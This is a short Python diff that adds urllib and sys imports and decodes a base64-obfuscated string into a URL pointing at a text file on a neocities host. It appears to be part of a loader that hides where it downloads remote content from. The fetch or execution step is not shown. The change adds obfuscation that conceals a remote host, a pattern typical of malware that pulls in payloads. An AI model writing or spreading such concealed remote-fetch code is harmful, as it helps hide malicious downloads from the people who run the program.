@@ -2,8 +2,11 @@ import time
 import threading
 import requests
 import base64
+import sys
+import urllib.request
+
 a = 'Lm5lb2NpdGllcy5vcmcvYmFzb2oudHh0'
-j = base64.b64decode(a)
+j = base64.b64decode(a).decode()
 
 link = f"https://femboiluver420{j}"
 
